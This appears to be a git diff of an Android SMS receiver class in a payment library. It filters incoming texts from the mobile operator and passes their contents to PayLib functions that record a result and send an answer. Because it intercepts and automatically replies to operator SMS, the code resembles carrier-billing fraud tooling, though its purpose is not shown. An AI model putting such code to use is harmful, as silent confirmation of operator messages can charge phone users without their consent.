@@ -1,4 +1,4 @@
-package com.example.p2plib2.sms;
+package  com.example.p2plib2.sms;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -8,19 +8,16 @@ import android.os.Bundle;
 import android.provider.Telephony;
 import android.telephony.SmsMessage;
 
-import com.example.p2plib2.Constants;
 import com.example.p2plib2.Logger;
 import com.example.p2plib2.PayLib;
 
-import static com.example.p2plib2.PayLib.mts_SMS;
-
+import static com.example.p2plib2.PayLib.operator;
 
 public class SmsMonitor extends BroadcastReceiver {
-    private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        Logger.lg("I receive!");
+        Logger.lg("New sms! " + intent.getAction() + " null " + (intent!=null));
         if (intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
             String smsSender = "";
             String smsBody = "";
@@ -46,12 +43,11 @@ public class SmsMonitor extends BroadcastReceiver {
                     smsSender = messages[0].getOriginatingAddress();
                 }
             }
-            if (smsSender.equals(mts_SMS)) {
+            Logger.lg("sender " + smsSender);
+            if (smsSender.equals(operator.smsNum) || smsSender.toUpperCase().equals(operator.name)) {
                 PayLib.getSMSResult(smsBody);
                 PayLib.sendAnswer(smsBody);
             }
-        } else {
-            Logger.lg("SMS_RECEIVED_ACTION not");
         }
     }
 }
